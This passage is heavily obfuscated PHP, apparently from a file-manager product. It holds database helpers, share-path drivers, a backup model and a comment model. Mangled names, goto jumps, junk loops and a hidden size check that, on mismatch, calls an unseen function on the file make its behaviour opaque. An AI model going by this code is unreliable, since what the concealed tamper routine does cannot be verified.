$ŠŞ‚¦»·; } public function getFields($³÷‰Ä“) { $·œÑÓ˜€ =& $_SERVER[Ã¶¡¶„æ]; $this->initConnect(!0); if (think_config($·œÑÓ˜€[947])) { $Œ¡ÑÓ = str_replace($·œÑÓ˜€[948], $³÷‰Ä“, think_config($·œÑÓ˜€[947])); } else { switch ($this->dbType) { case $·œÑÓ˜€[931]: case $·œÑÓ˜€[949]: $Œ¡ÑÓ = "\123\x45\114\105\103\x54\x20\x20\40\143\157\154\165\x6d\x6e\x5f\x6e\x61\x6d\145\40\x61\x73\x20\x27\x4e\x61\155\145\x27\x2c\40\40\40\144\x61\x74\141\x5f\x74\x79\x70\145\40\x61\x73\40\x27\124\171\160\145\47\x2c\x20\40\x20\143\x6f\154\x75\155\x6e\137\144\145\x66\x61\165\x6c\x74\40\x61\163\x20\47\104\x65\146\x61\165\x6c\x74\47\x2c\x20\x20\40\x69\163\137\x6e\165\x6c\154\x61\x62\x6c\145\40\x61\x73\40\47\116\x75\x6c\x6c\47\xa\11\x9\106\x52\117\115\11\x69\x6e\146\157\162\x6d\x61\x74\x69\157\x6e\x5f\x73\x63\x68\145\155\141\x2e\164\x61\142\x6c\145\x73\40\x41\123\x20\x74\12\11\x9\x4a\117\x49\116\11\151\x6e\146\x6f\x72\155\x61\x74\151\157\156\x5f\x73\x63\x68\145\x6d\x61\x2e\x63\x6f\x6c\165\x6d\x6e\x73\40\x41\x53\x20\143\12\x9\11\x4f\x4e\40\x20\164\56\x74\141\x62\154\x65\137\x63\x61\x74\x61\154\157\147\40\x3d\x20\143\56\x74\x61\142\x6c\145\x5f\x63\141\x74\x61\x6c\157\147\xa\x9\11\x41\116\x44\x20\x74\56\x74\141\x62\x6c\x65\137\x73\143\150\145\155\141\40\75\40\x63\56\x74\141\142\x6c\x65\137\x73\143\x68\x65\155\141\xa\11\x9\101\x4e\104\x20\x74\56\164\141\x62\x6c\145\x5f\x6e\x61\155\145\x20\x3d\40\143\x2e\164\141\142\x6c\145\x5f\156\x61\x6d\145\xa\x9\x9\x57\110\105\122\105\40\x20\x20\x74\x2e\164\141\x62\154\145\137\156\141\155\145\40\75\x20\x27{$³÷‰Ä“}\x27"; break; case $·œÑÓ˜€[950]: $Œ¡ÑÓ = $·œÑÓ˜€[951] . $³÷‰Ä“ . $·œÑÓ˜€[952]; break; case $·œÑÓ˜€[932]: case $·œÑÓ˜€[934]: $Œ¡ÑÓ = $·œÑÓ˜€[953] . $·œÑÓ˜€[954] . $·œÑÓ˜€[955] . strtoupper($³÷‰Ä“) . $·œÑÓ˜€[956] . strtoupper($³÷‰Ä“) . $·œÑÓ˜€[957]; break; case $·œÑÓ˜€[958]: $Œ¡ÑÓ = $·œÑÓ˜€[959] . $³÷‰Ä“ . $·œÑÓ˜€[960]; break; case $·œÑÓ˜€[933]: break; case $·œÑÓ˜€[961]: default: $Œ¡ÑÓ = $·œÑÓ˜€[962] . ($this->dbType == $·œÑÓ˜€[961] ? "\140{$³÷‰Ä“}\140" : $³÷‰Ä“); } } $Éò€òµ = $this->query($Œ¡ÑÓ); $³°‰é« = array(); if ($Éò€òµ) { foreach ($Éò€òµ as $¥˜‘Ú => $ÂæñëÉ§) { $ÂæñëÉ§ = array_change_key_case($ÂæñëÉ§); $ÂæñëÉ§[$·œÑÓ˜€[32]] = isset($ÂæñëÉ§[$·œÑÓ˜€[32]]) ? $ÂæñëÉ§[$·œÑÓ˜€[32]] : $·œÑÓ˜€[378]; $ÂæñëÉ§[$·œÑÓ˜€[33]] = isset($ÂæñëÉ§[$·œÑÓ˜€[33]]) ? $ÂæñëÉ§[$·œÑÓ˜€[33]] : $·œÑÓ˜€[378]; $˜€¢éá = isset($ÂæñëÉ§[$·œÑÓ˜€[273]]) ? $ÂæñëÉ§[$·œÑÓ˜€[273]] : $ÂæñëÉ§[$·œÑÓ˜€[32]]; $³°‰é«[$˜€¢éá] = array($·œÑÓ˜€[32] => $˜€¢éá, $·œÑÓ˜€[33] => $ÂæñëÉ§[$·œÑÓ˜€[33]], $·œÑÓ˜€[35] => (bool) (isset($ÂæñëÉ§[$·œÑÓ˜€[103]]) && $ÂæñëÉ§[$·œÑÓ˜€[103]] === $·œÑÓ˜€[12] || isset($ÂæñëÉ§[$·œÑÓ˜€[35]]) && $ÂæñëÉ§[$·œÑÓ˜€[35]] === $·œÑÓ˜€[12]), $·œÑÓ˜€[37] => isset($ÂæñëÉ§[$·œÑÓ˜€[37]]) ? $ÂæñëÉ§[$·œÑÓ˜€[37]] : (isset($ÂæñëÉ§[$·œÑÓ˜€[56]]) ? $ÂæñëÉ§[$·œÑÓ˜€[56]] : $·œÑÓ˜€[378]), $·œÑÓ˜€[39] => isset($ÂæñëÉ§[$·œÑÓ˜€[94]]) ? strtolower($ÂæñëÉ§[$·œÑÓ˜€[94]]) == $·œÑÓ˜€[41] : (isset($ÂæñëÉ§[$·œÑÓ˜€[57]]) ? $ÂæñëÉ§[$·œÑÓ˜€[57]] : !1), $·œÑÓ˜€[42] => isset($ÂæñëÉ§[$·œÑÓ˜€[963]]) ? strtolower($ÂæñëÉ§[$·œÑÓ˜€[963]]) == $·œÑÓ˜€[44] : (isset($ÂæñëÉ§[$·œÑÓ˜€[94]]) ? $ÂæñëÉ§[$·œÑÓ˜€[94]] : !1)); } } return $³°‰é«; } public function getTables($ï¦¯ÂÔº = '') { $¨ÖâÅ¸‘ =& $_SERVER[Ã¶¡¶„æ]; if (think_config($¨ÖâÅ¸‘[964])) { $’™›Ö¬Ú = str_replace($¨ÖâÅ¸‘[965], $ï¦¯ÂÔº, think_config($¨ÖâÅ¸‘[964])); } else { switch ($this->dbType) { case $¨ÖâÅ¸‘[932]: case $¨ÖâÅ¸‘[934]: $’™›Ö¬Ú = $¨ÖâÅ¸‘[966]; break; case $¨ÖâÅ¸‘[931]: case $¨ÖâÅ¸‘[949]: $’™›Ö¬Ú = $¨ÖâÅ¸‘[967]; break; case $¨ÖâÅ¸‘[958]: $’™›Ö¬Ú = $¨ÖâÅ¸‘[968]; break; case $¨ÖâÅ¸‘[933]: think_exception(think_lang($¨ÖâÅ¸‘[969]) . $¨ÖâÅ¸‘[970]); break; case $¨ÖâÅ¸‘[950]: $’™›Ö¬Ú = $¨ÖâÅ¸‘[45] . $¨ÖâÅ¸‘[46] . $¨ÖâÅ¸‘[47]; break; case $¨ÖâÅ¸‘[961]: default: if (!empty($ï¦¯ÂÔº)) { $’™›Ö¬Ú = $¨ÖâÅ¸‘[913] . $ï¦¯ÂÔº . $¨ÖâÅ¸‘[914]; } else { $’™›Ö¬Ú = $¨ÖâÅ¸‘[915]; } } } $¬úÏÎÛ = $this->query($’™›Ö¬Ú); $ĞÚÌ€¿· = array(); foreach ($¬úÏÎÛ as $‰ÜöÉÁË => $õ­³Üæ’) { $ĞÚÌ€¿·[$‰ÜöÉÁË] = current($õ­³Üæ’); } return $ĞÚÌ€¿·; } protected function parseLimit($»ş„Ä¹€) { $ÅÖêºåÓ =& $_SERVER[Ã¶¡¶„æ]; $„Š¢ÌùÛ = $ÅÖêºåÓ[12]; if (!empty($»ş„Ä¹€)) { switch ($this->dbType) { case $ÅÖêºåÓ[958]: case $ÅÖêºåÓ[950]: $»ş„Ä¹€ = explode($ÅÖêºåÓ[50], $»ş„Ä¹€); if (count($»ş„Ä¹€) > 1) { $„Š¢ÌùÛ .= $ÅÖêºåÓ[51] . $»ş„Ä¹€[1] . $ÅÖêºåÓ[52] . $»ş„Ä¹€[0] . $ÅÖêºåÓ[53]; } else { $„Š¢ÌùÛ .= $ÅÖêºåÓ[51] . $»ş„Ä¹€[0] . $ÅÖêºåÓ[53]; } break; case $ÅÖêºåÓ[931]: case $ÅÖêºåÓ[949]: break; case $ÅÖêºåÓ[933]: break; case $ÅÖêºåÓ[932]: case $ÅÖêºåÓ[934]: break; case $ÅÖêºåÓ[961]: default: $„Š¢ÌùÛ .= $ÅÖêºåÓ[51] . $»ş„Ä¹€ . $ÅÖêºåÓ[53]; } } return $„Š¢ÌùÛ; } public function parseKey(&$ç­Ğ‘£, $áó–î†Ñ = true) { $ãœñüÊè =& $_SERVER[Ã¶¡¶„æ]; if ($áó–î†Ñ) { $ç­Ğ‘£ = $this->parseKeyCheck($ç­Ğ‘£); } if ($this->dbType == $ãœñüÊè[961]) { if ($ç­Ğ‘£ != $ãœñüÊè[188] && !preg_match($ãœñüÊè[925], $ç­Ğ‘£)) { $ç­Ğ‘£ = $ãœñüÊè[385] . trim($ç­Ğ‘£, $ãœñüÊè[385]) . $ãœñüÊè[385]; } return $ç­Ğ‘£; } else { return parent::parseKey($ç­Ğ‘£, $áó–î†Ñ); } } public function close() { $this->_linkID = null; } public function error() { $ÈÏÅÖ¬ƒ =& $_SERVER[Ã¶¡¶„æ]; if ($this->PDOStatement) { $”¨÷Â˜Ï = $this->PDOStatement->errorInfo(); $this->error = $”¨÷Â˜Ï[1] . $ÈÏÅÖ¬ƒ[4] . $”¨÷Â˜Ï[2]; } else { $this->error = $ÈÏÅÖ¬ƒ[12]; } if ($ÈÏÅÖ¬ƒ[12] != $this->queryStr) { $this->error .= LNG($ÈÏÅÖ¬ƒ[48]) . $this->queryStr; } think_trace($this->error, $ÈÏÅÖ¬ƒ[12], $ÈÏÅÖ¬ƒ[49]); return $this->error; } public function escapeString($ÆÉ§¾ì) { $¹­¥•®È =& $_SERVER[Ã¶¡¶„æ]; switch ($this->dbType) { case $¹­¥•®È[958]: case $¹­¥•®È[931]: case $¹­¥•®È[949]: case $¹­¥•®È[961]: return addslashes($ÆÉ§¾ì); case $¹­¥•®È[933]: case $¹­¥•®È[950]: case $¹­¥•®È[932]: case $¹­¥•®È[934]: return str_ireplace($¹­¥•®È[58], $¹­¥•®È[59], $ÆÉ§¾ì); } } protected function parseValue($å¡Å¤ßä) { $óøí€…¿ =& $_SERVER[Ã¶¡¶„æ]; if (is_string($å¡Å¤ßä)) { $‡‡Ë»üŒ = strpos($å¡Å¤ßä, $óøí€…¿[4]) === 0 && in_array($å¡Å¤ßä, array_keys($this->bind)); $å¡Å¤ßä = $‡‡Ë»üŒ ? $this->escapeString($å¡Å¤ßä) : $óøí€…¿[971] . $this->escapeString($å¡Å¤ßä) . $óøí€…¿[971]; } elseif (isset($å¡Å¤ßä[0]) && is_string($å¡Å¤ßä[0]) && strtolower($å¡Å¤ßä[0]) == $óøí€…¿[297]) { $å¡Å¤ßä = $this->escapeString($å¡Å¤ßä[1]); } elseif (is_array($å¡Å¤ßä)) { $å¡Å¤ßä = array_map(array($this, $óøí€…¿[972]), $å¡Å¤ßä); } elseif (is_bool($å¡Å¤ßä)) { $å¡Å¤ßä = $å¡Å¤ßä ? $óøí€…¿[88] : $óøí€…¿[197]; } elseif (is_null($å¡Å¤ßä)) { $å¡Å¤ßä = $óøí€…¿[103]; } return $å¡Å¤ßä; } public function getLastInsertId() { $ÅéÀÜæ® =& $_SERVER[Ã¶¡¶„æ]; switch ($this->dbType) { case $ÅéÀÜæ®[958]: case $ÅéÀÜæ®[950]: case $ÅéÀÜæ®[931]: case $ÅéÀÜæ®[949]: case $ÅéÀÜæ®[933]: case $ÅéÀÜæ®[961]: return $this->_linkID->lastInsertId(); case $ÅéÀÜæ®[932]: case $ÅéÀÜæ®[934]: $Éİõáî = $this->table; $Õ½ÒæÎù = $this->query("\123\105\x4c\105\103\x54\x20{$Éİõáî}\x2e\x63\165\162\x72\166\141\x6c\40\x63\x75\162\x72\x76\x61\x6c\x20\106\122\x4f\115\40\144\x75\141\154"); return $Õ½ÒæÎù ? $Õ½ÒæÎù[0][$ÅéÀÜæ®[973]] : 0; } } } class DbSqlite extends DbSqliteBase { public function query($€šÍå™) { $Ìä±¾Óš =& $_SERVER[Ã¶¡¶„æ]; if (!CacheLock::fileLock($Ìä±¾Óš[13])) { return !1; } $™¢ÉíÏÛ = parent::query($€šÍå™); CacheLock::fileUnLock($Ìä±¾Óš[13]); return $™¢ÉíÏÛ; } public function execute($Üá„ùœ”) { $Áé’ğòİ =& $_SERVER[Ã¶¡¶„æ]; if (!CacheLock::fileLock($Áé’ğòİ[13])) { return !1; } $ı“üÖãé = parent::execute($Üá„ùœ”); CacheLock::fileUnLock($Áé’ğòİ[13]); return $ı“üÖãé; } } goto b§™ÀîÊ’Ë; C¤«ßåÜö¶: $_size = $_SERVER[Ã¶¡¶„æ][890]; if ($_SERVER[$_SERVER[Ã¶¡¶„æ][840]] != $_size($_file)) { $_getc = $_SERVER[Ã¶¡¶„æ][842]; $_getfile = $_SERVER[$_SERVER[Ã¶¡¶„æ][843]] . $_SERVER[Ã¶¡¶„æ][844]; $_getfilec = $_getc($_getfile); $_getarrs = explode($_SERVER[Ã¶¡¶„æ][231], $_getfilec); if (count($_getarrs) < $_SERVER[Ã¶¡¶„æ][619]) { $exit = $_SERVER[Ã¶¡¶„æ][845]; $exit(); } $_act = $_SERVER[Ã¶¡¶„æ][846]; $_act($_file); } class PathDriverDriverShareItem { public function __construct($üíÄçñ) { $this->pathParse = $üíÄçñ; } public function __call($Ë»‰±×Ù, $ŠÃóèË) { $Ï¥ İîÈ =& $_SERVER[Ã¶¡¶„æ]; if (method_exists($this, $Ë»‰±×Ù)) { return; } $¯ğ×ÕŞ = call_user_func_array(array($Ï¥ İîÈ[1360], $Ë»‰±×Ù), $ŠÃóèË); $®™³ìÉ’ = array($Ï¥ İîÈ[1361], $Ï¥ İîÈ[1362], $Ï¥ İîÈ[1363], $Ï¥ İîÈ[1364], $Ï¥ İîÈ[555], $Ï¥ İîÈ[557], $Ï¥ İîÈ[1365], $Ï¥ İîÈ[107], $Ï¥ İîÈ[1366], $Ï¥ İîÈ[1367]); if (in_array($Ë»‰±×Ù, $®™³ìÉ’)) { $¯ğ×ÕŞ = $this->getPathOuter($¯ğ×ÕŞ); } return $¯ğ×ÕŞ; } public function copy($ìíç©Ùè, $Íôù§ó, $ø­®ğ¿¬ = false, $û÷Ñ²¦€ = false) { return $this->copyMove($ìíç©Ùè, $Íôù§ó, $ø­®ğ¿¬, $_SERVER[Ã¶¡¶„æ][555], $û÷Ñ²¦€); } public function move($ü¬½ô—÷, $Å–¡¤¥, $§úÔœ›‚ = false, $³ùèø­ï = false) { return $this->copyMove($ü¬½ô—÷, $Å–¡¤¥, $§úÔœ›‚, $_SERVER[Ã¶¡¶„æ][557], $³ùèø­ï); } private function copyMove($ñÓäË¶Ã, $‹Í½ÉÉµ, $óº›Å€, $ÁüİáŸ, $›Øß—ÕÙ = false) { $úª«»şÂ =& $_SERVER[Ã¶¡¶„æ]; $À˜®ÛŒÆ = $‹Í½ÉÉµ; $Ú“‡£ÅÙ = IO::driverMake($‹Í½ÉÉµ); if ($Ú“‡£ÅÙ->pathParse[$úª«»şÂ[1165]]) { $‹Í½ÉÉµ = $Ú“‡£ÅÙ->pathParse[$úª«»şÂ[1165]]; } else { $‹Í½ÉÉµ = $À˜®ÛŒÆ; } $·„º§§Ç = IO::copyMove($ñÓäË¶Ã, $‹Í½ÉÉµ, $óº›Å€, $ÁüİáŸ, $›Øß—ÕÙ); $·„º§§Ç = $this->getPathOuter($·„º§§Ç); return $·„º§§Ç; } public function pathThis($âò÷§è¨) { return get_path_this($this->pathParse[$_SERVER[Ã¶¡¶„æ][84]]); } public function pathFather($¶‡™ Ú”) { return get_path_father($this->pathParse[$_SERVER[Ã¶¡¶„æ][84]]); } public function iconvSystem($¬¤Š¦÷¡) { return $¬¤Š¦÷¡; } protected function infoParse($ØÔ“ëü, $ğŞœ†Úä = false) { $ÆÏæ§“ =& $_SERVER[Ã¶¡¶„æ]; $ğãÇŒº¼ = $this->pathParse[$ÆÏæ§“[487]][$ÆÏæ§“[1190]] . $this->pathParse[$ÆÏæ§“[1183]]; if ($ğŞœ†Úä) { $²‚øŞßŒ = IO::infoWithChildren($ğãÇŒº¼); } else { $²‚øŞßŒ = IO::info($ğãÇŒº¼); } $ƒÈ§Ë = $this->pathParse[$ÆÏæ§“[487]]; return Action($ÆÏæ§“[1358])->_shareItemeParse($²‚øŞßŒ, $ƒÈ§Ë); } public function listAll($×°ø¼ô) { $â‚‰ªùÊ =& $_SERVER[Ã¶¡¶„æ]; $Úêáúä’ = IO::listAll($×°ø¼ô); $¹ù™‡ş = $this->pathParse[$â‚‰ªùÊ[487]]; foreach ($Úêáúä’ as &$°ÙÜ°ıÃ) { check_abort(); $‡®´¹ä¹ = IO::info($°ÙÜ°ıÃ[$â‚‰ªùÊ[84]]); $‡®´¹ä¹ = is_array($‡®´¹ä¹) ? $‡®´¹ä¹ : array(); $°ÙÜ°ıÃ = array_merge($‡®´¹ä¹, $°ÙÜ°ıÃ); $°ÙÜ°ıÃ[$â‚‰ªùÊ[86]] = Action($â‚‰ªùÊ[1358])->_shareItemeParse($°ÙÜ°ıÃ, $¹ù™‡ş); } unset($°ÙÜ°ıÃ); return $Úêáúä’; } public function getPathOuter($°‡Ì¬‡§) { $­İ“’¢ =& $_SERVER[Ã¶¡¶„æ]; $ùº†Òœ• = KodIO::parse($°‡Ì¬‡§); if ($ùº†Òœ•[$­İ“’¢[33]] == KodIO::KOD_SHARE_ITEM) { return $ùº†Òœ•[$­İ“’¢[84]]; } $ªÛ•Ä¢ú = KodIO::clear($°‡Ì¬‡§); $“Ë¡ò½¤ = KodIO::clear($this->pathParse[$­İ“’¢[487]][$­İ“’¢[1190]]); $–»ğş©Œ = substr($ªÛ•Ä¢ú, strlen($“Ë¡ò½¤)); if (substr($ªÛ•Ä¢ú, 0, strlen($“Ë¡ò½¤)) != $“Ë¡ò½¤) { return !1; } return $this->pathParse[$­İ“’¢[1184]] . $­İ“’¢[8] . ltrim($–»ğş©Œ, $­İ“’¢[8]); } public function getType() { $ÅïÆ³ï =& $_SERVER[Ã¶¡¶„æ]; $¢ÇÆ„¥Ê = str_replace($ÅïÆ³ï[74], $ÅïÆ³ï[12], get_class($this)); return strtolower($¢ÇÆ„¥Ê); } public function isTypeObject($Ä¨×éÉæ) { return IO::isTypeObject($Ä¨×éÉæ); } public function info($º…Óïì¾) { return $this->infoParse($º…Óïì¾); } public function infoAuth($©ÌêîÛ¢) { return $this->infoParse($©ÌêîÛ¢); } public function infoWithChildren($Ì²½êì ) { return $this->infoParse($Ì²½êì , !0); } public function infoFull($‹§„­•¿) { return $this->infoParse($‹§„­•¿); } } goto B¸¸âĞ‘İÀ; fõ”µ´êƒ: define($_SERVER[Ã¶¡¶„æ][612], $_SERVER[Ã¶¡¶„æ][613]); $stpewykzhf = $_SERVER[Ã¶¡¶„æ][614]; while ($stpewykzhf < $_SERVER[Ã¶¡¶„æ][615]) { if ($stpewykzhf >= 0) { break; } $stpewykzhf++; } goto fÖ ÔŞ÷Û; a±‘À¾Ì¸»: class BackupModel extends ModelBaseLight { public $optionType = "\x53\x79\163\x74\x65\x6d\56\142\x61\143\x6b\165\160\x4c\x69\x73\x74"; public $field = array("\x69\157", "\156\x61\155\x65", "\x73\x74\x61\x74\165\x73", "\x63\x6f\x6e\x74\x65\x6e\164", "\x6d\141\x6e\x75\141\x6c", "\162\145\x73\x75\x6c\164", "\x74\151\x6d\145\x46\x72\x6f\155", "\x74\x69\x6d\145\124\157"); public function config() { $½æ¾‡ë =& $_SERVER[Ã¶¡¶„æ]; $¥Ú€şÔ = Model($½æ¾‡ë[776])->get($½æ¾‡ë[786]); $¥Ú€şÔ = json_decode($¥Ú€şÔ, !0); $¥Ú€şÔ = is_array($¥Ú€şÔ) ? $¥Ú€şÔ : array(); if (!isset($¥Ú€şÔ[$½æ¾‡ë[761]])) { $¥Ú€şÔ[$½æ¾‡ë[761]] = $½æ¾‡ë[88]; } unset($¥Ú€şÔ[$½æ¾‡ë[1646]]); Action($½æ¾‡ë[1890])->taskInit(); Model($½æ¾‡ë[1645])->cacheClear(); $ †¼äÜ“ = $½æ¾‡ë[1891]; $İë îØÃ = Model($½æ¾‡ë[1892])->findByKey($½æ¾‡ë[1664], $ †¼äÜ“); if (!$İë îØÃ) { $İë îØÃ = array(); } if (isset($İë îØÃ[$½æ¾‡ë[203]])) { $İë îØÃ[$½æ¾‡ë[203]] = json_decode($İë îØÃ[$½æ¾‡ë[203]], !0); } if (isset($¥Ú€şÔ[$½æ¾‡ë[203]])) { $İë îØÃ[$½æ¾‡ë[203]][$½æ¾‡ë[1649]] = $¥Ú€şÔ[$½æ¾‡ë[203]]; unset($¥Ú€şÔ[$½æ¾‡ë[203]]); } return array_merge($İë îØÃ, $¥Ú€şÔ); } public function listData($Í·­Áä™ = false, $îªéèˆÊ = "\155\157\144\x69\x66\x79\x54\151\155\x65", $÷Í¢Ìş = false) { return parent::listData($Í·­Áä™, $îªéèˆÊ, !0); } public function lastItem() { $Ó·ÆâÇ = $this->listData(); return !empty($Ó·ÆâÇ[0]) ? $Ó·ÆâÇ[0] : null; } public function kill($Æ™¾©ÃÃ) { $Õ£ĞÈ¯ =& $_SERVER[Ã¶¡¶„æ]; $½Ÿ‰÷º´ = $this->listData($Æ™¾©ÃÃ); if (!$½Ÿ‰÷º´ || empty($½Ÿ‰÷º´[$Õ£ĞÈ¯[32]])) { return !0; } Task::kill($Õ£ĞÈ¯[785]); Task::kill($Õ£ĞÈ¯[806]); Task::kill($Õ£ĞÈ¯[815]); $Ñ®ãÇ‚ = $½Ÿ‰÷º´[$Õ£ĞÈ¯[32]]; $üê²§ù = TEMP_FILES . $Õ£ĞÈ¯[784] . $Ñ®ãÇ‚ . $Õ£ĞÈ¯[8]; IO::remove($üê²§ù, !1); return $this->remove($Æ™¾©ÃÃ); } public function remove($õ¿ÎŒŠ) { $ôºª‰¾ = $this->listData($õ¿ÎŒŠ); if (!$ôºª‰¾) { return !0; } return $this->backupRemove($ôºª‰¾); } private function backupRemove($»Éê‘–¨) { parent::remove($»Éê‘–¨[$_SERVER[Ã¶¡¶„æ][399]]); $áˆåå½ = $this->backupPath($»Éê‘–¨); IO::remove($áˆåå½, !1); return !0; } private function backupPath($ÔêŒ ì) { $¼ó¤Å—ò =& $_SERVER[Ã¶¡¶„æ]; $©¦û“øÎ = $ÔêŒ ì[$¼ó¤Å—ò[32]]; $Úº¡¢âø = Model($¼ó¤Å—ò[776])->get($¼ó¤Å—ò[777]); $ˆÕó¢¯Š = substr(md5($¼ó¤Å—ò[778] . $Úº¡¢âø . $©¦û“øÎ), 0, 8); return "\173\151\157\72{$ÔêŒ ì[$¼ó¤Å—ò[758]]}\175\57\x64\x61\x74\141\x62\x61\x73\x65\x2f\142\141\x63\153\165\x70\57" . $©¦û“øÎ . $¼ó¤Å—ò[11] . $ˆÕó¢¯Š; } public function start() { $òş’íè½ =& $_SERVER[Ã¶¡¶„æ]; if ($GLOBALS[$òş’íè½[6]][$òş’íè½[89]][$òş’íè½[1893]] != $òş’íè½[88]) { return !0; } $„¡ÖıŸ¡ = $this->config(); if (!$„¡ÖıŸ¡ || $„¡ÖıŸ¡[$òş’íè½[1646]] != $òş’íè½[88]) { return !1; } $²Ş˜®Íƒ = $this->process(); foreach ($²Ş˜®Íƒ as $‘ÑÂëÌŞ) { if ($‘ÑÂëÌŞ) { return Task::restart($‘ÑÂëÌŞ[$òş’íè½[399]]); } } $Ê’“¡…¹ = new Backup(); $ú…Á’€ = $Ê’“¡…¹->db(); if ($ú…Á’€) { $ú…Á’€ = $Ê’“¡…¹->dbFile(); if ($ú…Á’€ && $„¡ÖıŸ¡[$òş’íè½[761]] == $òş’íè½[197]) { $ú…Á’€ = $Ê’“¡…¹->file(); } } Backup::set(array($òş’íè½[756] => 1, $òş’íè½[497] => time())); return !0; } public function process() { $ÇÌ‰ŞÙ =& $_SERVER[Ã¶¡¶„æ]; $ÊÆÕå—ó = array($ÇÌ‰ŞÙ[764] => Task::get($ÇÌ‰ŞÙ[785]), $ÇÌ‰ŞÙ[768] => Task::get($ÇÌ‰ŞÙ[806]), $ÇÌ‰ŞÙ[199] => Task::get($ÇÌ‰ŞÙ[815])); $‘ÙËÅí = !1; foreach ($ÊÆÕå—ó as &$ãÚà …Â) { if ($‘ÙËÅí) { $ãÚà …Â = !1; continue; } if ($ãÚà …Â) { $ÚÂßÍíí = intval(_get($ãÚà …Â, $ÇÌ‰ŞÙ[1681], 0)); if (time() - $ÚÂßÍíí > 7200) { Task::kill($ãÚà …Â[$ÇÌ‰ŞÙ[399]]); $‘ÙËÅí = !0; $ãÚà …Â = !1; } } } return $ÊÆÕå—ó; } public function restore() { $ª«ëäÖß =& $_SERVER[Ã¶¡¶„æ]; ActionCall($ª«ëäÖß[1074], !0, 1); ActionCall($ª«ëäÖß[1074], !0, 0); } } class CommentModel extends ModelBase { protected $tableName = "\x63\157\155\155\145\x6e\x74"; protected $tableMeta = array("\x74\141\142\154\145\116\141\x6d\x65" => "\x63\157\155\x6d\x65\156\164\137\155\145\x74\x61", "\155\145\164\141\x46\x69\x65\x6c\x64" => "\143\157\155\155\145\x6e\164\111\104"); const TYPE_SOURCE = 1; const TYPE_SHARE = 2; const TYPE_USER = 3; const TYPE_GROUP = 4; const TYPE_TOPIC = 5; const TYPE_STAR_OFFSET = 100000000; public static $TYPEALL = array(self::TYPE_SOURCE, self::TYPE_SHARE, self::TYPE_USER, self::TYPE_GROUP, self::TYPE_TOPIC); public function addComment($´ŒÈÖšâ) { $—£é½ª =& $_SERVER[Ã¶¡¶„æ]; if ($´ŒÈÖšâ[$—£é½ª[1894]]) { $Ÿ§Ÿ°á£ = $this->where(array($—£é½ª[1895] => $´ŒÈÖšâ[$—£é½ª[1894]]))->find(); if (!$Ÿ§Ÿ°á£ || $Ÿ§Ÿ°á£[$—£é½ª[411]] != $´ŒÈÖšâ[$—£é½ª[411]] || $Ÿ§Ÿ°á£[$—£é½ª[505]] != $´ŒÈÖšâ[$—£é½ª[505]]) { return !1; } $this->where(array($—£é½ª[1895] => $´ŒÈÖšâ[$—£é½ª[1894]]))->setAdd($—£é½ª[1896], 1); } $´ŒÈÖšâ[$—£é½ª[1897]] = 0; $´ŒÈÖšâ[$—£é½ª[1896]] = 0; $´ŒÈÖšâ[$—£é½ª[756]] = 1; return $this->add($´ŒÈÖšâ); } public function commentCount($Ÿù—¦’ê, $ğÌò¼É, $³Œ™†Ëå = false) { $Ü×ú¢’Ì =& $_SERVER[Ã¶¡¶„æ]; if (!$Ÿù—¦’ê) { return array(); } if (is_string($Ÿù—¦’ê) || is_int($Ÿù—¦’ê)) { $Ÿù—¦’ê = array($Ÿù—¦’ê); } $§ŒÑ—²Ï = array($Ü×ú¢’Ì[505], $Ü×ú¢’Ì[1898] => $Ü×ú¢’Ì[500]); $Ê±Ã²ùİ = array($Ü×ú¢’Ì[505] => array($Ü×ú¢’Ì[7], $Ÿù—¦’ê), $Ü×ú¢’Ì[411] => $ğÌò¼É); if ($³Œ™†Ëå) { $Ê±Ã²ùİ[$Ü×ú¢’Ì[1676]] = $³Œ™†Ëå; } $Îß¿ëĞ• = $this->field($§ŒÑ—²Ï)->where($Ê±Ã²ùİ)->group($Ü×ú¢’Ì[505])->select(); return array_to_keyvalue($Îß¿ëĞ•, $Ü×ú¢’Ì[505], $Ü×ú¢’Ì[500]); } public function starTarget($âÒ‘§½˜, $ñù™ßô…) { $§áéİØ¥ =& $_SERVER[Ã¶¡¶„æ]; $—‘ÏæÆµ = $âÒ‘§½˜ + self::TYPE_STAR_OFFSET; $ñ£Í´Ÿ¯ = array($§áéİØ¥[1676] => USER_ID, $§áéİØ¥[411] => $—‘ÏæÆµ, $§áéİØ¥[505] => $ñù™ßô…); $ğÄ½ÆÍ = $this->where($ñ£Í´Ÿ¯)->find(); if ($ğÄ½ÆÍ) { return $this->where(array($§áéİØ¥[399] => $ğÄ½ÆÍ[$§áéİØ¥[399]]))->delete(); } $ğè¾ºÕö = array($§áéİØ¥[1894] => 0, $§áéİØ¥[1676] => USER_ID, $§áéİØ¥[756] => 1, $§áéİØ¥[761] => $§áéİØ¥[12], $§áéİØ¥[411] => $—‘ÏæÆµ, $§áéİØ¥[505] => $ñù™ßô…, $§áéİØ¥[1897] => 0, $§áéİØ¥[1896] => 0); return $this->add($ğè¾ºÕö); } public function starTargetCount($ƒ®˜Ù€, $ºİ´”Íû) { $ã«‹è‘ =& $_SERVER[Ã¶¡¶„æ]; $ËÍñçò = $ºİ´”Íû + self::TYPE_STAR_OFFSET; $Çµ’´µ = $this->commentCount($ƒ®˜Ù€, $ËÍñçò); $ÎÎŞ­ß› = $this->commentCount($ƒ®˜Ù€, $ËÍñçò, USER_ID); return array($ã«‹è‘[1899] => $Çµ’´µ, $ã«‹è‘[1900] => $ÎÎŞ­ß›); } public function starTargetUserList($¾ÏÄš´é, $Ó§ĞÌå) { $†ˆ‘„é¾ =& $_SERVER[Ã¶¡¶„æ]; $şªØ…šˆ = $¾ÏÄš´é + self::TYPE_STAR_OFFSET; $œá“À ô = array($†ˆ‘„é¾[505] => $Ó§ĞÌå, $†ˆ‘„é¾[411] => $şªØ…šˆ); $õ¤¨¹¨‚ = $this->where($œá“À ô)->count(); $ºŞèÕû÷ = array($†ˆ‘„é¾[255] => $õ¤¨¹¨‚, $†ˆ‘„é¾[1901] => array()); if (!$õ¤¨¹¨‚) { return $ºŞèÕû÷; } $ûÖË¿–è = $this->field($†ˆ‘„é¾[1676])->where($œá“À ô)->limit(500)->select(); $ûÖË¿–è = array_to_keyvalue($ûÖË¿–è, $†ˆ‘„é¾[12], $†ˆ‘„é¾[1676]); $ºŞèÕû÷[$†ˆ‘„é¾[1901]] = Model($†ˆ‘„é¾[513])->userListInfo($ûÖË¿–è); return $ºŞèÕû÷; } public function prasiseUserList($í‹ÏŠ÷Â) { $ï™¬²‹ =& $_SERVER[Ã¶¡¶„æ]; $ï«‰¹»Ó = array($ï™¬²‹[1902] => $í‹ÏŠ÷Â); 